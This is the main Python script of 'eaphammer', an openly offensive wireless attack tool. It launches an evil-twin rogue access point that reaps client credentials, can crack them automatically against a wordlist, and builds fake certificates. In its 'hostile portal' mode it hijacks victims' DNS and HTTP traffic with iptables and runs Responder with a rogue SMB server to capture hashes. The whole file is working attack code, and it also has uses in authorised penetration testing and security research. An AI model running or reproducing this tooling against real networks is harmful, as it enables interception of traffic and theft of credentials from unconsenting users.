#!/usr/bin/env python

import sys
import os
import time
import json
import argparse
import core.cli

from core import cert_manager, conf_manager, utils, responder, services
from core.servers.redirect_server import RedirectServer
from core.autocrack import Autocrack
from core.hostapd import HostapdEaphammer
from core.hostapd_config import HostapdConfig
from argparse import ArgumentParser
from settings import settings, __version__


def cert_wizard():

    while True:

        print ('[*] Please enter two letter country '
                            'code for certs (i.e. US, FR)')

        country = raw_input(': ').upper()
        if len(country) == 2:
            break
        print '[!] Invalid input.'

    print ('[*] Please enter state or province for '
                        'certs (i.e. Ontario, New Jersey)')
    state = raw_input(': ')

    print '[*] Please enter locale for certs (i.e. London, Hong Kong)'
    locale = raw_input(': ')

    print '[*] Please enter organization for certs (i.e. Evil Corp)'
    org = raw_input(': ')

    print '[*] Please enter email for certs (i.e. cyberz@h4x0r.lulz)'
    email = raw_input(': ')

    print '[*] Please enter common name (CN) for certs.'
    cn = raw_input(': ')

    cert_manager.ca_cnf.configure(country, state, locale, org, email, cn)
    cert_manager.server_cnf.configure(country, state, locale, org, email, cn)
    cert_manager.client_cnf.configure(country, state, locale, org, email, cn)

    cert_manager.bootstrap()

def hostile_portal():
    global responder

    try:
        utils.Iptables.save_rules()
    
        # start autocrack if enabled
        if options['autocrack']:

            autocrack = Autocrack.get_instance()
            autocrack.configure(wordlist=options['wordlist'])
            autocrack.start()

        # prepare environment
        utils.nmcli.set_unmanaged(options['interface'])
        utils.set_ipforward(1)

        # write hostapd config file to tmp directory
        hostapd_conf = HostapdConfig(settings, options)
        hostapd_conf.write()

        # start hostapd
        hostapd = HostapdEaphammer(settings, options)
        hostapd.start()

        # configure routing 
        os.system('ifconfig %s 10.0.0.1 netmask 255.255.255.0' %\
                                                         options['interface'])
        os.system('route add -net 10.0.0.0 netmask 255.255.255.0 gw 10.0.0.1')

        # configure dnsmasq
        conf_manager.dnsmasq_captive_portal_cnf.configure(interface=options['interface']) 
        services.Dnsmasq.hardstart('-C %s 2>&1' % settings.dict['paths']['dnsmasq']['conf'])

        # start RedirectServer
        rs = RedirectServer.get_instance()
        rs.configure('10.0.0.1')
        rs.start()

        # start Responder
        if options['pivot']:

            print '[*] Pivot mode activated. Rogue SMB server disabled.'
            print ('[*] Run payload_generator to '
                        'generate a timed payload if desired.')

            settings.dict['core']['responder']['Responder Core']['SMB'] = 'Off'

        else:

            settings.dict['core']['responder']['Responder Core']['SMB'] = 'On'

        resp = responder.Responder.get_instance()
        resp.configure(interface=options['interface'])
        resp.start()

        # set iptables policy, flush all tables for good measure
        utils.Iptables.accept_all()
        utils.Iptables.flush()
        utils.Iptables.flush('nat')

        # use iptables to redirect all DNS and HTTP(S) traffic to PHY
        utils.Iptables.route_dns2_addr('10.0.0.1', options['interface'])
        utils.Iptables.route_http2_addr('10.0.0.1', options['interface'])

        # pause execution until user quits
        raw_input('\n\nPress enter to quit...\n\n')

        hostapd.stop()
        services.Dnsmasq.kill()
        rs.stop()
        resp.stop()
        if options['autocrack']:
            autocrack.stop()

        # remove hostapd conf file from tmp directory
        if options['save_config']:
            hostapd_conf.save()
        hostapd_conf.remove()

        # restore iptables to a clean state (policy, flush tables)
        utils.Iptables.accept_all()
        utils.Iptables.flush()
        utils.Iptables.flush('nat')

        utils.Iptables.restore_rules()

        # cleanly allow network manager to regain control of interface
        utils.nmcli.set_managed(options['interface'])


    except KeyboardInterrupt:
    
        hostapd.stop()
        services.Dnsmasq.kill()
        rs.stop()
        resp.stop()
        if options['autocrack']:
            autocrack.stop()

        # remove hostapd conf file from tmp directory
        if options['save_config']:
            hostapd_conf.save()
        hostapd_conf.remove()
        
        # restore iptables to a clean state (policy, flush tables)
        utils.Iptables.accept_all()
        utils.Iptables.flush()
        utils.Iptables.flush('nat')

        utils.Iptables.restore_rules()

        # cleanly allow network manager to regain control of interface
        utils.nmcli.set_managed(options['interface'])

def captive_portal():

    try:

        utils.Iptables.save_rules()

        # prepare environment
        utils.set_ipforward(1)
        utils.nmcli.set_unmanaged(options['interface'])

        # start autocrack if enabled
        if options['autocrack']:

            autocrack = Autocrack.get_instance()
            autocrack.configure(wordlist=options['wordlist'])
            autocrack.start()

        # write hostapd config file to tmp directory
        hostapd_conf = HostapdConfig(settings, options)
        hostapd_conf.write()

        # start hostapd
        hostapd = HostapdEaphammer(settings, options)
        hostapd.start()

        # configure routing 
        os.system('ifconfig %s 10.0.0.1 netmask 255.255.255.0' %\
                                                     options['interface'])
        os.system('route add -net 10.0.0.0 netmask 255.255.255.0 gw 10.0.0.1')

        # configure dnsmasq
        conf_manager.dnsmasq_captive_portal_cnf.configure(interface=options['interface'])
        services.Dnsmasq.hardstart('-C %s 2>&1' % settings.dict['paths']['dnsmasq']['conf'])

        # start httpd
        services.Httpd.start()

        # set iptables policy, flush all tables for good measure
        utils.Iptables.accept_all()
        utils.Iptables.flush()
        utils.Iptables.flush('nat')

        # use iptables to redirect all DNS and HTTP(S) traffic to PHY
        utils.Iptables.route_dns2_addr('10.0.0.1', options['interface'])
        utils.Iptables.route_http2_addr('10.0.0.1', options['interface'])
        
        # pause execution until user quits
        raw_input('\n\nPress enter to quit...\n\n')

        hostapd.stop()
        services.Dnsmasq.kill()
        services.Httpd.stop()
        if options['autocrack']:
            autocrack.stop()

        # remove hostapd conf file from tmp directory
        if options['save_config']:
            hostapd_conf.save()
        hostapd_conf.remove()
        
        # restore iptables to a clean state (policy, flush tables)
        utils.Iptables.accept_all()
        utils.Iptables.flush()
        utils.Iptables.flush('nat')

        utils.Iptables.restore_rules()

        # cleanly allow network manager to regain control of interface
        utils.nmcli.set_managed(options['interface'])

    except KeyboardInterrupt:

        hostapd.stop()
        services.Dnsmasq.kill()
        services.Httpd.stop()
        if options['autocrack']:
            autocrack.stop()

        # remove hostapd conf file from tmp directory
        if options['save_config']:
            hostapd_conf.save()
        hostapd_conf.remove()
        
        # restore iptables to a clean state (policy, flush tables)
        utils.Iptables.accept_all()
        utils.Iptables.flush()
        utils.Iptables.flush('nat')

        utils.Iptables.restore_rules()

        # cleanly allow network manager to regain control of interface
        utils.nmcli.set_managed(options['interface'])

def reap_creds():

    try:

        utils.Iptables.save_rules()

        # start autocrack if enabled
        if options['autocrack']:

            autocrack = Autocrack.get_instance()
            autocrack.configure(wordlist=options['wordlist'])
            autocrack.start()

        utils.nmcli.set_unmanaged(options['interface'])

        # write hostapd config file to tmp directory
        hostapd_conf = HostapdConfig(settings, options)
        hostapd_conf.write()

        # start hostapd
        hostapd = HostapdEaphammer(settings, options)
        hostapd.start()

        # pause execution until user quits  
        raw_input('\n\nPress enter to quit...\n\n')

        hostapd.stop()
        if options['autocrack']:
            autocrack.stop()

        # remove hostapd conf file from tmp directory
        if options['save_config']:
            hostapd_conf.save()
        hostapd_conf.remove()

        # cleanly allow network manager to regain control of interface
        utils.nmcli.set_managed(options['interface'])

    except KeyboardInterrupt:

        hostapd.stop()
        if options['autocrack']:
            autocrack.stop()

        # remove hostapd conf file from tmp directory
        if options['save_config']:
            hostapd_conf.save()
        hostapd_conf.remove()

        # cleanly allow network manager to regain control of interface
        utils.nmcli.set_managed(options['interface'])

def save_config_only():

    hostapd_conf = HostapdConfig(settings, options)
    hostapd_conf.write()
    hostapd_conf.save()
    hostapd_conf.remove()

def print_banner():


    print '''
                     .__                                         
  ____ _____  ______ |  |__ _____    _____   _____   ___________ 
_/ __ \\\\__  \\ \\____ \\|  |  \\\\__  \\  /     \\ /     \\_/ __ \\_  __ \\
\\  ___/ / __ \\|  |_> >   Y  \\/ __ \\|  Y Y  \\  Y Y  \\  ___/|  | \\/
 \\___  >____  /   __/|___|  (____  /__|_|  /__|_|  /\\___  >__|   
     \\/     \\/|__|        \\/     \\/      \\/      \\/     \\/       

                            "Unrelenting Force"

                                v%s
    ''' % (__version__)

if __name__ == '__main__':

    print_banner()

    #options = set_options()
    options = core.cli.set_options()

    if options['debug']:
        print '[debug] Settings:'
        print json.dumps(settings.dict, indent=4, sort_keys=True)
        print '[debug] Options:'
        print json.dumps(options, indent=4, sort_keys=True)

    if options['cert_wizard']:
        cert_wizard()
    elif options['save_config_only']:
        save_config_only()        
    elif options['captive_portal']:
        captive_portal()
    elif options['hostile_portal']:
        hostile_portal()
    else:
        reap_creds()

